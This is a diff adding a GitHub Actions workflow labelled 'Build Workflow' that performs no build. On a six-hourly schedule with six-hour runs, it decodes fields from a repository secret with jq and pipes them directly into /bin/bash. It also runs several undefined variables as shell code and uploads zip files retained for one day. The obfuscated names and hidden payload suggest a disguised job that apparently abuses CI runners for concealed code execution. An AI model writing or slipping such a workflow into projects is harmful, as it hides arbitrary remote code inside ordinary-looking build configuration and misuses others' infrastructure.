@@ -1,0 +1,31 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '3 4,10,16,22 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          z72: ${{ secrets.z72 }}
+        run: |
+          printf '%s' "$z72" | jq -r .vfpk5948 | /bin/bash
+          echo $z3 | jq -r .yft3701 | /bin/bash
+          printf '%s' "$d76" | jq -r .qk09 | /bin/bash
+          printf '%s' "$kxua5606" | jq -r .vqx163 | /bin/bash
+
+      - name: Upload results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: KVbIbn61
+          path: "*.zip"
+          retention-days: 1
